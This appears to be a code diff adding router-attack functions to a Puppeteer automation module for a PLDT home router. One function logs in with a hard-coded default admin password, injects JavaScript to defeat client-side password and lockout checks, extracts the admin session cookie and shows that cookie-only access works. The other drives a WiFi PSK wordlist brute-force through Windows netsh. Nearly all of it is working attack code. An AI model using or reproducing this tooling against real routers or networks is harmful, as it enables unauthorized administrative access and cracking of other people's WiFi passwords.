@@ -731,6 +731,201 @@ async function testLogin(page, username, password) {
 }
 
 /**
+ * Login as adminpldt, bypass the overlay, and return the session cookie.
+ *
+ * Flow:
+ *   1. Navigate to admin.html
+ *   2. If locked out, wait for lockout to clear
+ *   3. Inject JS bypasses (CheckPassword, preflag, etc.)
+ *   4. Make password field visible (type=text)
+ *   5. Type credentials (visible!), click Login
+ *   6. Extract the Cookie with id=1 from browser cookies
+ *   7. DEMO: clear all cookies → set only the session cookie
+ *      → navigate to admin page WITHOUT login form
+ *      → proves session token alone bypasses auth
+ *   8. Return the cookie value
+ *
+ * Does NOT change any settings — purely reads the session token.
+ *
+ * @param {import('puppeteer').Page} page
+ * @param {string} [username='adminpldt']
+ * @param {string} [password='AC2DIU7QW3ERTY6UPAS4DFG']
+ * @param {Object} [opts]
+ * @param {boolean} [opts.showPassword=true]  Make password visible while typing
+ * @param {boolean} [opts.demoReuse=true]     Demonstrate cookie-only auth after login
+ * @returns {Promise<string>} The session cookie value (sid=...:Language:english:id=1)
+ */
+async function loginAndGetSessionToken(page, username = 'adminpldt', password = 'AC2DIU7QW3ERTY6UPAS4DFG', opts = {}) {
+  const { showPassword = true, demoReuse = true } = opts;
+  const routerUrl = process.env.ROUTER_IP
+    ? `https://${process.env.ROUTER_IP}`
+    : 'https://192.168.1.1';
+
+  // === STEP 1: Navigate to admin login ===
+  console.log('\n═══════════════════════════════════════════════');
+  console.log('  STEP 1: Navigating to router admin login...');
+  console.log('═══════════════════════════════════════════════\n');
+  await page.goto(`${routerUrl}/admin.html`, {
+    waitUntil: 'domcontentloaded',
+    timeout: 15000,
+    ignoreHTTPSErrors: true,
+  });
+  await sleep(2000);
+
+  // === Handle lockout ===
+  for (let attempt = 0; attempt < 30; attempt++) {
+    const lockTime = await page.evaluate(() => window.LockLeftTime || 0).catch(() => 0);
+    if (lockTime > 0) {
+      console.log(`[session] Locked out (${lockTime}s). Waiting...`);
+      await sleep(Math.min(lockTime + 2, 65) * 1000);
+      await page.goto(`${routerUrl}/admin.html`, {
+        waitUntil: 'domcontentloaded',
+        timeout: 15000,
+        ignoreHTTPSErrors: true,
+      });
+      await sleep(2000);
+      continue;
+    }
+    break;
+  }
+
+  // === STEP 2: Inject bypasses ===
+  console.log('\n───────────────────────────────────────────────');
+  console.log('  STEP 2: Injecting JS bypasses...');
+  console.log('    • CheckPassword → always returns 0');
+  console.log('    • preflag → 0 (disable PLDT2 overlay)');
+  console.log('    • LockLeftTime → 0 (clear lockout)');
+  console.log('───────────────────────────────────────────────\n');
+  await page.evaluate(() => {
+    window.CheckPassword = () => 0;
+    window.setDisable = () => {};
+    window.Userlevel = 0;
+    window.preflag = 0;
+    window.DisplayWifiPldt = () => {};
+    window.BandSteeringState = () => {};
+    window.LockLeftTime = 0;
+    window.FailStat = '0';
+    window.LoginTimes = 0;
+  });
+  await sleep(500);
+
+  // === STEP 3: Make password field visible ===
+  if (showPassword) {
+    console.log('\n───────────────────────────────────────────────');
+    console.log('  STEP 3: Making password field VISIBLE...');
+    console.log('    (Switching input type from "password" to "text")');
+    console.log('───────────────────────────────────────────────\n');
+    await page.evaluate(() => {
+      const pw = document.getElementById('txt_Password');
+      if (pw) pw.type = 'text';
+    });
+    await sleep(500);
+  }
+
+  // === STEP 4: Type credentials (visible) ===
+  console.log('\n───────────────────────────────────────────────');
+  console.log('  STEP 4: Typing credentials (watch the fields!)...');
+  console.log(`    Username: ${username}`);
+  console.log(`    Password: ${password}`);
+  console.log('───────────────────────────────────────────────\n');
+  await page.type('input#txt_Username', username, { delay: 50 });
+  await page.type('input#txt_Password', password, { delay: 30 });
+
+  await sleep(800);
+
+  // === STEP 5: Click login ===
+  console.log('\n───────────────────────────────────────────────');
+  console.log('  STEP 5: Clicking Login...');
+  console.log('───────────────────────────────────────────────\n');
+  await page.click('button#button');
+  await sleep(4000);
+
+  // === STEP 6: Extract the session cookie ===
+  console.log('\n───────────────────────────────────────────────');
+  console.log('  STEP 6: Extracting session cookie...');
+  console.log('───────────────────────────────────────────────\n');
+  const cookies = await page.cookies();
+  let sessionCookie = null;
+
+  for (const cookie of cookies) {
+    if (cookie.name === 'Cookie' && cookie.value.includes('id=1')) {
+      sessionCookie = cookie.value;
+      console.log(`  ✅ Found admin cookie:`);
+      console.log(`     Name:  ${cookie.name}`);
+      console.log(`     Domain: ${cookie.domain}`);
+      console.log(`     Path:   ${cookie.path}`);
+      console.log(`     Secure: ${cookie.secure}`);
+      console.log(`     HttpOnly: ${cookie.httpOnly}`);
+      console.log(`     Value: ${sessionCookie}`);
+      break;
+    }
+  }
+
+  if (!sessionCookie) {
+    const state = await page.evaluate(() => ({
+      LockLeftTime: window.LockLeftTime,
+      LoginTimes: window.LoginTimes,
+      preflag: window.preflag,
+      url: window.location.href,
+    })).catch(() => ({}));
+    console.error(`[session] Login failed. State: ${JSON.stringify(state)}`);
+    throw new Error(`No admin session cookie (id=1) found. State: ${JSON.stringify(state)}`);
+  }
+
+  // === STEP 7: DEMO — session cookie reuse ===
+  if (demoReuse) {
+    console.log('\n═══════════════════════════════════════════════');
+    console.log('  🎯 DEMO: Session Cookie Reuse');
+    console.log('  Bypassing login using ONLY the cookie...');
+    console.log('═══════════════════════════════════════════════\n');
+
+    // Navigate to a dummy page first to clear state
+    console.log('[demo] Navigating away to clear page state...');
+    await page.goto('about:blank', { waitUntil: 'domcontentloaded', timeout: 5000 });
+    await sleep(500);
+
+    // Set ONLY the session cookie — no other auth
+    console.log('[demo] Setting session cookie directly (no password!)...');
+    await page.setCookie({
+      name: 'Cookie',
+      value: sessionCookie,
+      domain: '192.168.1.1',
+      path: '/',
+      httpOnly: true,
+      secure: true,
+    });
+
+    // Now navigate to a protected admin page
+    console.log('[demo] Navigating to admin page WITHOUT logging in...');
+    console.log('[demo] Only the session cookie is being sent...');
+    await sleep(1000);
+
+    await page.goto(`${routerUrl}/html/amp/wlanbasic/WlanBasic.asp?2G`, {
+      waitUntil: 'domcontentloaded',
+      timeout: 15000,
+      ignoreHTTPSErrors: true,
+    });
+    await sleep(3000);
+
+    const finalUrl = page.url();
+    const hasLoginForm = await page.evaluate(() => !!document.getElementById('txt_Username')).catch(() => false);
+
+    if (finalUrl.includes('WlanBasic') && !hasLoginForm) {
+      console.log('\n  🎉 SUCCESS: Admin page loaded with cookie ONLY!');
+      console.log('  No login form, no password needed.');
+      console.log('  The session cookie IS the authentication.\n');
+    } else {
+      console.warn(`\n  ⚠️  Reuse may have issues — URL: ${finalUrl}, Login form: ${hasLoginForm}\n`);
+    }
+  }
+
+  console.log('\n═══════════════════════════════════════════════');
+  console.log('  ✅ DONE — cookie returned, no settings changed');
+  console.log('═══════════════════════════════════════════════\n');
+  return sessionCookie;
+}
+
+/**
  * Dismiss the forced password-change overlay by hiding/removing it via JS.
  * Returns true if overlay was found and removed.
  */
@@ -992,6 +1187,43 @@ async function diagnoseNetwork(page, ssid, url, waitMs = 10000) {
   return result;
 }
 
+/**
+ * WiFi PSK Brute-Force using netsh.
+ *
+ * Runs `bruteForce()` from the wifi_bruteforce module with real-time
+ * progress reporting. Does NOT require a Puppeteer page — it operates
+ * purely via Windows netsh commands.
+ *
+ * @param {Object}   opts
+ * @param {string[]} [opts.passwords]       - Custom wordlist
+ * @param {string}   [opts.wordlistFile]    - Path to wordlist file
+ * @param {AbortSignal} [opts.signal]       - AbortController signal
+ * @param {function} [opts.onProgress]      - Progress callback
+ * @param {function} [opts.onFound]         - Found callback
+ * @returns {Promise<Object>}               - Brute-force result
+ */
+async function executeWifiBruteForce(opts = {}) {
+  const { bruteForce } = require('./wifi_bruteforce');
+
+  console.log('[bruteforce] Starting WiFi PSK brute-force...');
+  const result = await bruteForce({
+    passwords: opts.passwords,
+    wordlistFile: opts.wordlistFile,
+    signal: opts.signal,
+    onProgress: (p) => {
+      console.log(`[bruteforce] [${p.index + 1}/${p.total}] "${p.password}" → ${p.state} (${p.rate}/min, ETA ~${p.eta}min)`);
+      if (opts.onProgress) opts.onProgress(p);
+    },
+    onFound: (f) => {
+      console.log(`[bruteforce] FOUND: "${f.password}" IP: ${f.ip} in ${f.attempts} attempts (${f.elapsed}s)`);
+      if (opts.onFound) opts.onFound(f);
+    },
+  });
+
+  console.log(`[bruteforce] Complete: found=${result.found}, attempts=${result.attempts}, elapsed=${result.elapsed}s`);
+  return result;
+}
+
 module.exports = {
   loginRouter,
   isLoggedIn,
@@ -1001,8 +1233,10 @@ module.exports = {
   executeAdminPasswordChange,
   executeNetworkScan,
   executeWifiPasswordScan,
+  executeWifiBruteForce,
   injectOverlayBypass,
   dismissOverlay,
+  loginAndGetSessionToken,
   getCurrentWifiSSID,
   switchWifi,
   diagnoseNetwork,
